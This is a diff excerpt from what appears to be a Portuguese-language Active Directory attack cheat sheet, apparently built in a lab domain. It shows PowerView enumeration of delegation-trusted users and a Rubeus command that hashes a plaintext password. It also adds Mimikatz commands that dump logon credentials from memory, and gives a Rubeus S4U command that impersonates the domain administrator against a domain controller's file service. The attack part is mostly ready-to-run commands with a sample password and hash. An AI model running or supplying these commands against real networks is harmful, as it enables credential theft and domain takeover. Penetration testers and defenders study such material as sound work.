@@ -1436,12 +1436,16 @@ $FormatEnumerationLimit=-1
 Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
 Get-DomainUser -TrustedToAuth
 ```
-##### CONSTRAINED DELEGATION (USUARIO) - NO RUBEUS, GERAR O HASH RC4 DA SENHA DO USUARIO: yamcha 
+##### CONSTRAINED DELEGATION (USUARIO) - NO RUBEUS, GERAR O HASH RC4 DA SENHA DO USUARIO: yamcha 1A9D94FDE4F369D53FA5515D1D6BEEE0
 ```
 rubeus.exe hash /password:123qwe..
 ```
-1A9D94FDE4F369D53FA5515D1D6BEEE0
 
+OU PEGAR O HASH DIRETO COM O MIMIKATZ:
+```
+Privilege::debug
+Sekurlsa::logonpasswords
+```
 ##### CONSTRAINED DELEGATION (USUARIO) - NO RUBEUS, SOLICITAR TGS PARA A MAQUINA QUE TEMOS ACESSO PARA OS SERVICOS AUTORIZADOS NO AD: (cifs/TECH-DC01.TECH.LOCAL)
 ```
 rubeus.exe s4u /user:yamcha /rc4:1A9D94FDE4F369D53FA5515D1D6BEEE0 /impersonateuser:"administrator" /msdsspn:"cifs/TECH-DC01.TECH.LOCAL" /ptt
